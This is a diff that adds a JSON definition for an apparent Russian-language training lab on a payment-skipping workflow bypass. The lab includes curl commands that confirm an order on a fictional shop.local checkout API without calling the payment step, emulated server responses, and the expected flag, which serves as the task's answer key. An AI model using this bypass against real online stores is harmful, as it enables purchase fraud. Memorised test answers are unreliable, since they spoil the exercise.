@@ -1,0 +1,42 @@
+{
+  "id": "web-business-logic-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{w0rkfl0w_byp4ss_sk1pp3d_p4ym3nt}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: workflow bypass (пропуск оплаты)\n\n`shop.local` оформляет заказ в несколько шагов: корзина → адрес → оплата →\nподтверждение. Сценарий предполагает, что `confirm` вызывается ПОСЛЕ\n`pay`, но сервер не проверяет факт оплаты. Обойди шаг.\n\n1. Обычная последовательность:\n   curl -s -X POST https://shop.local/api/checkout/cart -d 'item=9'\n   curl -s -X POST https://shop.local/api/checkout/address -d 'addr=a1'\n2. Вызови подтверждение НАПРЯМУЮ, без оплаты:\n   curl -s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1'\n3. Заказ подтверждён без оплаты — в ответе флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/checkout/*)",
+      "cases": [
+        {
+          "match": "checkout/confirm",
+          "example": "-s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1'",
+          "output": "{\"order_id\":7002,\"status\":\"confirmed\",\"paid\":false,\"note\":\"order confirmed without payment step\",\"flag\":\"nto{w0rkfl0w_byp4ss_sk1pp3d_p4ym3nt}\"}\n"
+        },
+        {
+          "match": "checkout/pay",
+          "example": "-s -X POST https://shop.local/api/checkout/pay -d 'cart_id=c1'",
+          "output": "{\"paid\":true,\"method\":\"card\"}\n"
+        },
+        {
+          "match": "checkout/cart",
+          "example": "-s -X POST https://shop.local/api/checkout/cart -d 'item=9'",
+          "output": "{\"cart_id\":\"c1\",\"items\":[{\"item\":9,\"qty\":1}]}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /api/checkout/cart|address|pay|confirm на shop.local.\n"
+    }
+  }
+}
